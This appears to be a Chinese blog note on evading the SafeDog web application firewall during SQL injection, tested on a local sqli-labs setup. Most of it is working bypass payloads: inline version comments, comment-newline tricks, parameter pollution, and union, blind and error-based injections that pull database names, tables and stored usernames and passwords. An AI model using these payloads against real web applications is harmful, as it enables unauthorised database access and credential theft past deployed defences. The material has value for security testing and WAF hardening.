**SQL注入bypass笔记**

## waf是如何防御的

waf是通过使用一组规则来区分正常请求和恶意请求的。例如：安全狗、云锁、D盾等。

绕过：既然是存在规则匹配，那么就可以想方法绕过规则匹配。比如常见的黑名单限制，黑名单模型使用预设

## 一、sql注入bypass

### 环境搭建

> win7
>
> phpstdy（mysql：5.7.0 php:5.3.29）
>
> 网站apache安全狗（4.0.28330.0）
>
> sqlilabs靶场

### 绕过

将防护等级调到最高级：

![1612675684_601f7a6442b5374a95e0d.png!small](https://image.3001.net/images/20210207/1612675684_601f7a6442b5374a95e0d.png!small)
**and 1=1 绕过**

首先，尝试' and 1=1和' or 1=1

![1612675773_601f7abd5874316b5ed9c.png!small](https://image.3001.net/images/20210207/1612675773_601f7abd5874316b5ed9c.png!small)![1612675857_601f7b11d544e45bc6cd4.png!small](https://image.3001.net/images/20210207/1612675857_601f7b11d544e45bc6cd4.png!small)都会被防火墙拦截。
尝试替换and和or关键字：替换成&&, ||

![1612675880_601f7b28ea9904b7077c6.png!small](https://image.3001.net/images/20210207/1612675880_601f7b28ea9904b7077c6.png!small)![1612675895_601f7b37a7454a1f90380.png!small](https://image.3001.net/images/20210207/1612675895_601f7b37a7454a1f90380.png!small)

还是被狗拦截掉了。那么就要想办法把1=1入手，要么将1=1换掉，要么使用尝试内联注释。首先，含是使用and或者or，

将1=1改成负数-1=-1

![1612676121_601f7c19283277a9693e1.png!small](https://image.3001.net/images/20210207/1612676121_601f7c19283277a9693e1.png!small)可以看到成功绕过，说明安全狗没有对负数进行检测。

接着尝试内联注释：

    
    
    /*%"!*/and/*%"!*/1=1--+    --拦截
    /*%!%22/*/and/*%!%22/*/1=1--+  --不拦截

![1612676194_601f7c62d1a1b1664f9ae.png!small](https://image.3001.net/images/20210207/1612676194_601f7c62d1a1b1664f9ae.png!small)

![1612676215_601f7c778c56593ded773.png!small](https://image.3001.net/images/20210207/1612676215_601f7c778c56593ded773.png!small)

 **order by 绕过** ：

就使用内联注释

    
    
    /*%!%22/*/order/*%!%22/*/by+3--+   --不拦截
    order%23%0Aby 3--+         --不拦截，当发现%23注释之后，不会再去检查了，所以就利用单行注释和换行来绕过

![1612676253_601f7c9d9c94439544006.png!small](https://image.3001.net/images/20210207/1612676253_601f7c9d9c94439544006.png!small)一般的安全狗对order
by 查询中间添加一些无用的数据不会拦截。

 **union select 绕过**

内联注入：

    
    
    union /*!10440select*/ 1,2,3

![1612676299_601f7ccb6ef6653041a5e.png!small](https://image.3001.net/images/20210207/1612676299_601f7ccb6ef6653041a5e.png!small)

当然也可以fuzz中间的版本号：0440 – 10449 11440-11449 12440-12449 13440-13449 14400-14499
15440-15449 16440-16449 17440-17449 18440-18449 19440-19449都可以。

注：MySQL数据库为了保持与其他数据库兼容，特意新添加的功能。 为了避免从MySQL中导出的SQL语句不能被其他数据库使用，它把一些
MySQL特有的语句放在 /! .../ 中，这些语句在不兼容的数据库中使用时便 不会执行。而MySQL自身却能识别、执行。
/50001/表示数据库版本>=5.00.01时中间的语句才会执行。

第二种方法：注释绕过

    
    
    union %23%0aall select      ——union 注释+换行 all select（做出多次查询）

![1612676333_601f7ced01dc241876289.png!small](https://image.3001.net/images/20210207/1612676333_601f7ced01dc241876289.png!small)

 **函数的注入**

采用的办法内联注释：

    
    
    union /*!10440select*/ 1,hex(user/**/()),3
    union /*!10440select*/ 1,hex(database/**/()),3
    union /*!10440select*/ 1,hex(@@version/**/()),3
    union /*!10440select*/ 1,hex(@@datadir),3

![1612676373_601f7d15ab5ccdb18b21d.png!small](https://image.3001.net/images/20210207/1612676373_601f7d15ab5ccdb18b21d.png!small)

![1612676394_601f7d2a26606b3943a16.png!small](https://image.3001.net/images/20210207/1612676394_601f7d2a26606b3943a16.png!small)另一种方法：

    
    
    ?/*&id=-1'union select 1,user(),3 --+*/

![1612676425_601f7d49a627061cb9e56.png!small](https://image.3001.net/images/20210207/1612676425_601f7d49a627061cb9e56.png!small)

这里就是--+注释符把后面的/形成了一个完整的sql语句。

对于information_schema是没有进行检测的，所以只要保证前面的union和select绕过就可以。

1：

    
    
    ?id=-1'union /*!10440select*/ 1,group_concat(schema_name),3 from information_schema.schemata--+

![1612676453_601f7d656acc7e38c4acd.png!small](https://image.3001.net/images/20210207/1612676453_601f7d656acc7e38c4acd.png!small)

2：

    
    
    ?/*&id=-1'union select 1,group_concat(schema_name),3 from information_schema.schemata--+*/

![1612676535_601f7db7d522864dbe500.png!small](https://image.3001.net/images/20210207/1612676535_601f7db7d522864dbe500.png!small)

    
    
    ?/*&id=-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' and table_schema='security'--+*/
    ?/*&id=-1'union select 1,username,password from users where id='3'--+*/

那么通过这两种方法，就能得到数据库的表，列命和字段内容。

 **盲注**

1.时间盲注：

利用方法：内联注释

    
    
    ?/*&id=1' and if(ascii(substr(database(),1,1))=115,sleep(3),1)--+*/
    ?/*&id=1%27%20and%20if(ascii(substr(database/**/(),1,1))=115,sleep/**/(3),1)--+*/
    ?/*&id=1' and if(ascii(substr(database(/*!*/),1,1))=115,sleep(/*!3*/),1)--+*/
    ?id=1' /*!10440and*/ if(ascii(substr(database/**/(),1,1))=115,sleep/**/(4),1)--+

![1612676570_601f7ddab3c651031291d.png!small](https://image.3001.net/images/20210207/1612676570_601f7ddab3c651031291d.png!small)

![1612676589_601f7ded4d5e23a731b4b.png!small](https://image.3001.net/images/20210207/1612676589_601f7ded4d5e23a731b4b.png!small)

利用方法：if 前面添加！~ -
    
    
    ?id=1' and !if(ascii(substr(database/**/(),1,1))=115,sleep/**/(3),1)--+
    ?id=1' and ~if(ascii(substr(database/**/(),1,1))=115,sleep/**/(3),1)--+
    ?id=1' and -if(ascii(substr(database/**/(),1,1))=115,sleep/**/(3),1)--+

![1612676609_601f7e0136c57b28e2e74.png!small](https://image.3001.net/images/20210207/1612676609_601f7e0136c57b28e2e74.png!small)

 **bool盲注**

盲注方法：内联注释

    
    
    ?id=1' /*!10440and*/length(database/**/())=8--+
    ?/*&id=1' and left(database/**/(),1)='s'--+
    ?/*&id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database/**/() limit 0,1),1,1))=101--+
    ?/*&id=1%27%20and%20ord(mid((select%20ifnull(cast(username%20as%20char),0x20)%20from%20security.users%20order%23%0Aby%20id%20limit%200,1),1,1))=68--+

![1612676651_601f7e2b4b04b42128f8f.png!small](https://image.3001.net/images/20210207/1612676651_601f7e2b4b04b42128f8f.png!small)

![1612676665_601f7e391aa670eac714d.png!small](https://image.3001.net/images/20210207/1612676665_601f7e391aa670eac714d.png!small)

![1612676685_601f7e4de5836710bd3a5.png!small](https://image.3001.net/images/20210207/1612676685_601f7e4de5836710bd3a5.png!small)

![1612676704_601f7e60505c6481bc9d0.png!small](https://image.3001.net/images/20210207/1612676704_601f7e60505c6481bc9d0.png!small)

 **报错注入**

来绕过报错注入中常用的两个函数updatexml()和extractvalue()函数

利用方法：注释+换行。

    
    
    ?/*&id=1%27%20and%20extractvalue%23%0A(1,concat(0x7e,(/*!10440select*/database/**/()),0x7e))--+
    ?id=1%27%20and%20extractvalue%23%0A(1,concat(0x7e,(/*!10440select*/version()),0x7e))--+

![1612676727_601f7e77874d9f91cbaac.png!small](https://image.3001.net/images/20210207/1612676727_601f7e77874d9f91cbaac.png!small)

![1612676745_601f7e896e86498e83daa.png!small](https://image.3001.net/images/20210207/1612676745_601f7e896e86498e83daa.png!small)

爆表：

    
    
    ?/*&id=1%27%20and%20extractvalue%23%0A(1,concat(0x7e,(select%20group_concat(table_name)from%23%0ainformation_schema.tables%23%0awhere%20table_schema=%27security%27),0x7e))--+*/
    ?id=1%27%20and%20extractvalue%23%0A(1,concat(0x7e,(select%20group_concat(table_name)from%23%0ainformation_schema.tables%23%0awhere%20table_schema=0x7365637572697479),0x7e))--+

![1612676776_601f7ea8e3f89626e9348.png!small](https://image.3001.net/images/20210207/1612676776_601f7ea8e3f89626e9348.png!small)

爆列名更上面的一样。那么爆字段内容不能直接select username from users limit 1而是在from后面再写一个注释换行。

    
    
    ?id=1%27%20and%20extractvalue%23%0A(1,concat(0x7e,(select%20username%20from%23%0ausers%20limit%201),0x7e))--+

![1612676798_601f7ebe8f532455ba666.png!small](https://image.3001.net/images/20210207/1612676798_601f7ebe8f532455ba666.png!small)

## 总结:

对于这个版本的安全狗，它对/**/http参数污染能够直接绕过。但是有的含是需要结合内联注释、函数、反引号、注释换行结合起来进行绕狗。但是，最新的安全狗，它的规则多了，防护也高，只有不断尝试这些方法，或者一些新的思路，然后才能绕过。对与绕过还是多尝试，自己搭环境去做，然后慢慢有了思路，就可以绕过了

payload参考链接[https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI﻿](https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI)

